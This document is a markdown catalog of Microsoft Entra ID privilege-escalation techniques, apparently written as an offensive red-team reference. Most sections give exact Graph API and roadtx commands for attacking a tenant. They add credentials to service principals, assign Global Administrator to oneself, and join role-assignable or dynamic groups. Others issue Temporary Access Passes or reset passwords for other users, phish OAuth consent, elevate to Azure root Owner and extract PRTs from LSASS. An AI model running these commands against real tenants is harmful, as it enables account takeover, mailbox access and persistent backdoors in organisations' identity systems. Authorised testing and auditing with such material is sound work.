# Entra ID privilege-escalation catalog

Exact commands for each primitive. Prereq tokens shown as `$GT` (MS Graph access
token). Get one with `roadtx gettokens ... -r msgraph` then
`GT=$(python3 -c "import json;print(json.load(open('.roadtools_auth'))['accessToken'])")`,
or just use `az rest` (it tokens Graph automatically when the URL is
graph.microsoft.com).

## 1. App / service-principal owner → add credential → act as SP

You own (BloodHound: `AZOwns` → `AZApp`/`AZServicePrincipal`, or hold
`AZAppAdmin`/`AZCloudAppAdmin`) an application whose SP has roles/permissions.

```bash
# Add a password to the APPLICATION object (owner of app works):
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/applications/<app-object-id>/addPassword" \
  --body '{"passwordCredential":{"displayName":"svc-sync"}}'
# ... or directly to the SERVICE PRINCIPAL (Application Admin / SP owner):
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-object-id>/addPassword" \
  --body '{"passwordCredential":{"displayName":"svc-sync"}}'
# Response contains "secretText" — shown ONCE. Then authenticate as the SP:
roadtx gettokens -c <app-client-id> -p '<secretText>' -t <tenant-id> -r msgraph   # client creds
az login --service-principal -u <app-client-id> -p '<secretText>' --tenant <tenant-id>
```

Certificate variant (quieter in some tenants): `addKey` with a self-signed cert,
then `az login --service-principal --password cert.pem`.

What makes a target SP valuable — its **app-role assignments** (roadrecon.db
`AppRoleAssignments`, BloodHound `AZMG*` edges). Dangerous Graph app roles:

| App role (Graph) | appRoleId | Gives |
|---|---|---|
| RoleManagement.ReadWrite.Directory | 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 | assign ANY directory role → GA |
| AppRoleAssignment.ReadWrite.All | 06b708a9-e830-4db3-a914-8e69da51d44f | grant yourself any app role → GA |
| Application.ReadWrite.All | 1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9 | addPassword on every app → pivot |
| Directory.ReadWrite.All | 19dbc75e-c2e2-444c-a770-ec69d8559fc7 | write most directory objects |
| Group.ReadWrite.All | 62a82d76-70ea-41e2-9197-370581804d09 | join/own any non-role group |
| UserAuthenticationMethod.ReadWrite.All | 50483e42-d915-4231-9639-7fdb7fd190e5 | add TAP/FIDO for any user |
| Mail.ReadWrite / Mail.Send (all) | — | tenant-wide mailbox access |

As an SP with `RoleManagement.ReadWrite.Directory`, assign Global Admin:

```bash
az rest --method post --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"principalId":"<your-object-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/"}'
```

As an SP with `AppRoleAssignment.ReadWrite.All`, grant yourself
RoleManagement.ReadWrite.Directory first (POST
`/servicePrincipals/<your-sp-id>/appRoleAssignments` with the Graph SP
(`appId 00000003-0000-0000-c000-000000000000`) as `resourceId`), then do the above.

## 2. Group-based escalation

**Role-assignable groups** (`isAssignableToRole: true`): owner or any principal
with `AZAddMembers`/`AZAddOwner` on one inherits whatever directory role the
group holds.

```bash
az rest --method post --url "https://graph.microsoft.com/v1.0/groups/<group-id>/members/\$ref" \
  --body '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/<your-object-id>"}'
```

(Note: adding members to role-assignable groups requires Privileged Role Admin
*or group ownership* — ownership is the common misconfig.)

**Dynamic groups**: `roadrecon.db` → `select displayName, membershipRule from Groups
where membershipRule is not null`. If the rule keys on an attribute you can set
on yourself or on a guest you invite — e.g. `user.otherMails -any (_ -contains "admin")`
or `user.userPrincipalName -match ".*-adm.*"` — set the attribute and Entra adds
you automatically:

```bash
az rest --method patch --url "https://graph.microsoft.com/v1.0/users/<your-object-id>" \
  --body '{"otherMails":["admin@example.com"]}'
```

Guest-invite variant: invite an attacker-controlled address that satisfies the
rule (`POST /v1.0/invitations`).

## 3. Directory-role chains (reset / auth-method abuse)

| You hold | You can take over |
|---|---|
| Global Administrator | everything incl. ARM via elevateAccess |
| Privileged Role Administrator | assign any role → GA |
| Privileged Authentication Administrator | reset password / auth methods of ANY user incl. GA |
| Authentication Administrator | auth methods of non-admins + some admin roles |
| User Administrator | reset passwords of non-admin users, group owners |
| Helpdesk / Password Administrator | reset passwords of non-admins |
| Intune Administrator | code exec on enrolled devices (`AZExecuteCommand`) → loot PRTs |
| Exchange Administrator | mailbox takeover, app-impersonation |
| Hybrid Identity Administrator | federation settings → backdoor domain (Golden SAML-style) |
| Partner Tier2 Support (legacy) | effectively reset GA passwords |

Password reset / Temporary Access Pass:

```bash
az rest --method post --url "https://graph.microsoft.com/v1.0/users/<target-id>/authentication/temporaryAccessPassMethods" \
  --body '{"isUsableOnce":false,"lifetimeInMinutes":60}'       # returns a TAP: log in as them
az rest --method post --url "https://graph.microsoft.com/beta/users/<target-id>/authentication/passwordMethods/<id>/resetPassword" \
  --body '{"newPassword":"Ex@mpl3-Reset1"}'
```

**Administrative units**: role assignments can be AU-scoped — check
`directoryScopeId` on role assignments (`/administrativeUnits/<id>` vs `/`). An
AU-scoped Auth Admin fully owns the AU's members. **Restricted management AUs**
hide member objects from tenant-wide admins — if a target "doesn't exist" for
you but shows in AzureHound data collected earlier, suspect an RMAU.

## 4. Illicit consent / OAuth app attacks

Attacker-registered app + consent:

```bash
# Register an app in YOUR tenant (multi-tenant) or the target tenant:
az rest --method post --url "https://graph.microsoft.com/v1.0/applications" \
  --body '{"displayName":"HR Portal","signInAudience":"AzureADMultipleOrgs","web":{"redirectUris":["https://login.example.net/cb"]}}'
```

- **User consent** (if tenant allows): phish users to the authorize URL with
  user-consentable scopes (`Mail.Read offline_access Files.Read.All ...`);
  harvest the auth code at your redirect URI, redeem for tokens.
- **Admin consent**: with Cloud App Admin/GA (or by phishing an admin to
  `.../adminconsent?client_id=...`), consent to application permissions —
  persistent, user-less access. Grants appear in `OAuth2PermissionGrants`
  (delegated) and `AppRoleAssignments` (application) — the same tables you
  audit for existing backdoors.

## 5. Global Admin → Azure RBAC (identity plane → resource plane)

```bash
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?action=elevateAccess&api-version=2016-09-01"
# Now User Access Administrator at root "/":
az role assignment create --assignee <your-object-id> --role Owner --scope "/"
az account list --all        # all subscriptions now visible -> azure-enumeration
```

Reverse direction also matters: Owner/Contributor on a subscription that hosts
VMs/Automation/Function Apps with **managed identities holding Graph app roles**
lets you ride those identities back into the directory
(`cloud-privilege-escalation` covers the ARM-side moves).

## 6. Token-level escalation recap

- **FOCI**: any first-party refresh token → any family client/resource
  (`roadtx refreshtokento`). Use to sidestep per-app conditional access.
- **PRT**: register a device + request PRT (`roadtx device` / `roadtx prt`) →
  device-compliance and (after `prtenrich`) MFA claims; `browserprtauth` gives a
  portal session. On a compromised AAD-joined host: `Get-AADIntUserPRTToken`,
  or extract from LSASS/CloudAP (mimikatz/ROADtoken/requestaadrefreshtoken).
- **CA-gap routing**: pick client+platform+location combos the policy set
  misses (from `roadrecon plugin policies`): legacy-auth exclusions, excluded
  break-glass groups, "all cloud apps except...", Linux platform gaps.

## roadrecon.db triage queries

```sql
-- SPs with existing credentials (someone already backdoored, or creds to steal)
select displayName, passwordCredentials, keyCredentials from ServicePrincipals
 where passwordCredentials != '[]' or keyCredentials != '[]';
-- dynamic groups
select displayName, membershipRule from Groups where membershipRule is not null;
-- role-assignable groups
select objectId, displayName from Groups where isAssignableToRole = 1;
-- dangerous Graph app-role grants
select a.principalDisplayName, a.appRoleId from AppRoleAssignments a
 where a.appRoleId in ('9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8',
                       '06b708a9-e830-4db3-a914-8e69da51d44f',
                       '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9');
-- delegated consent grants (illicit-grant hunting)
select clientId, consentType, principalId, scope from OAuth2PermissionGrants;
```

## BloodHound hunting (AzureHound data)

- Owned → tenant: `MATCH p=shortestPath((n {owned:true})-[*1..]->(t:AZTenant)) RETURN p`
- GA holders: `MATCH p=(n)-[:AZGlobalAdmin|AZHasRole*1..]->(t:AZTenant) RETURN p`
  (CE: use the pre-built "Entra" queries).
- App-cred abuse: edges `AZAddSecret`, `AZAppAdmin`, `AZCloudAppAdmin`,
  `AZOwns` into `AZApp`/`AZServicePrincipal`, then `AZRunsAs` to see what the SP is.
- Graph-role abuse: `AZMGGrantAppRoles`, `AZMGAddSecret`, `AZMGAddOwner`,
  `AZMGGrantRole`.
- Group abuse: `AZAddMembers`, `AZAddOwner` into role-assignable groups.
- Device/Intune: `AZExecuteCommand`, `AZOwns` on `AZDevice`.
- ARM crossover: `AZUserAccessAdministrator`, `AZOwner`, `AZContributor`,
  `AZVMContributor`, `AZKeyVaultContributor`, `AZGetSecrets/Keys/Certificates`.

Key directory-role template IDs (used by `scripts/parse_azurehound.py`):

```
Global Administrator                 62e90394-69f5-4237-9190-012177145e10
Privileged Role Administrator        e8611ab8-c189-46e8-94e1-60213ab1f814
Privileged Authentication Admin      7be44c8a-adaf-4e2a-84d6-ab2649e08a13
Application Administrator            9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3
Cloud Application Administrator      158c047a-c907-4556-b7ef-446551a6b5f7
User Administrator                   fe930be7-5e62-47db-91af-98c3a49a38b1
Authentication Administrator         c4e39bd9-1100-46d3-8c65-fb160da0071f
Helpdesk Administrator               729827e3-9c14-49f7-bb1b-9608f156bbb8
Hybrid Identity Administrator        8ac3fc64-6eca-42ea-9e69-59f4c7b60eb2
Intune Administrator                 3a2c62db-5318-420d-8d74-23affee5d9d5
Exchange Administrator               29232cdf-9323-42fd-ade2-1d097af3e4de
Groups Administrator                 fdd7a751-b60b-444a-984c-02652fe8fa1c
Partner Tier2 Support                e00e864a-17c5-4a4b-9c06-f5b95a8d5bd8
```
